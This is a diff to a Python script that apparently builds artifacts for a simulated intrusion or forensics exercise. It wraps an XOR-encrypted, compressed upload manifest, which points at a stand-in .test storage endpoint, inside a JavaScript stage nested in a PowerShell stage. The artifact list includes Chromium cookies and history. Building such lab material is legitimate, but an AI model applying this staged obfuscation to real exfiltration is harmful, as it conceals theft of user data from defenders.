@@ -30,20 +30,43 @@ def zip_entry(name: str, data: bytes, *, stored: bool = False) -> tuple[zipfile.
 
 
 def build_stage() -> bytes:
-    script = (ROOT / "callback-stage.ps1").read_bytes()
-    instructions = (ROOT / "collection-instructions.json").read_bytes()
-    integrity = sha256(script + instructions)
+    collection = (ROOT / "FKCOL-2841.json").read_bytes()
+    manifest = json.dumps(
+        {
+            "schema": "fieldkest.collection-manifest/v2",
+            "endpoint": "https://objects.keplerops.test",
+            "bucket": "fieldlink-collections",
+            "object_key": "callbacks/CB-17/FKCOL-2841.json",
+            "object_sha256": sha256(collection),
+            "collection_id": "FKCOL-2841",
+            "endpoint_id": "CB-17",
+        },
+        sort_keys=True,
+        separators=(",", ":"),
+    ).encode()
+    key = hashlib.sha256(b"FKCOL-2841:CB-17:collector-stage").digest()[:16]
+    compressed_manifest = zlib.compress(manifest, level=9)
+    encrypted_manifest = bytes(
+        value ^ key[index % len(key)]
+        for index, value in enumerate(compressed_manifest)
+    )
+    javascript = (
+        (ROOT / "collector-stage.js").read_text()
+        .replace("__MANIFEST_BASE64__", base64.b64encode(encrypted_manifest).decode())
+        .replace("__MANIFEST_KEY_HEX__", key.hex())
+    ).encode()
+    powershell = (
+        (ROOT / "callback-stage.ps1").read_text()
+        .replace("__STAGE2_SHA256__", sha256(javascript))
+        .replace("__STAGE2_BASE64__", base64.b64encode(zlib.compress(javascript, level=9)).decode())
+    ).encode()
     lines = [
-        "FIELDKEST-STAGE/1",
+        "FIELDKEST-STAGE/2",
         "collection=FKCOL-2841",
         "payload-encoding=base64+zlib",
-        f"payload-sha256={sha256(script)}",
-        "instructions-encoding=base64",
-        f"instructions-sha256={sha256(instructions)}",
-        f"callback-integrity={integrity}",
+        f"payload-sha256={sha256(powershell)}",
         "",
-        "payload=" + base64.b64encode(zlib.compress(script, level=9)).decode(),
-        "instructions=" + base64.b64encode(instructions).decode(),
+        "payload=" + base64.b64encode(zlib.compress(powershell, level=9)).decode(),
         "",
     ]
     data = "\n".join(lines).encode()
@@ -192,6 +215,7 @@ def write_manifest() -> None:
     names = (
         "staging-FKCOL-2841.bin",
         "field-notes-2026-08.odt",
+        "FKCOL-2841.json",
         "chromium-History",
         "chromium-Cookies",
     )
